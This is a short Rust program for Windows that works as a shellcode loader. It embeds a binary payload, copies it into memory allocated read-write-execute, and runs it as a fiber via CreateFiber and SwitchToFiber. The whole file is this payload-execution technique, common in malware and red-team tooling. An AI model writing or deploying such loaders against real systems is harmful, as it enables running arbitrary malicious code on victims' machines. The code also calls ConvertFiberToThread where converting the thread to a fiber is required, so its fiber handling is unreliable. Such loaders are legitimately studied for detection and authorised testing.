#![allow(deprecated)]

use std::{intrinsics::copy_nonoverlapping, mem::transmute, ptr::null_mut};

use windows_sys::Win32::System::{
    Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAlloc},
    Threading::{ConvertFiberToThread, CreateFiber, DeleteFiber, SwitchToFiber},
};

const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.bin");
const SHELLCODE_SIZE: usize = SHELLCODE_BYTES.len();

fn pause() {
    println!("[*] Press Enter to continue...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
}

fn main() {
    unsafe {
        let shellcode_ptr = VirtualAlloc(
            null_mut(),
            SHELLCODE_SIZE,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if shellcode_ptr.is_null() {
            println!("[!] Failed to allocate memory for shellcode");
            return;
        }

        println!(
            "[+] Allocated {} bytes at {:p} for shellcode",
            SHELLCODE_SIZE, shellcode_ptr
        );

        copy_nonoverlapping(
            SHELLCODE_BYTES.as_ptr(),
            shellcode_ptr as *mut u8,
            SHELLCODE_SIZE,
        );

        let main_thread = ConvertFiberToThread();

        let fiber = CreateFiber(0, transmute(shellcode_ptr), std::ptr::null_mut());

        if fiber.is_null() {
            println!("[!] Failed to create fiber");
            return;
        }

        pause();

        SwitchToFiber(fiber);

        DeleteFiber(fiber);
        ConvertFiberToThread();
    }

    return;
}
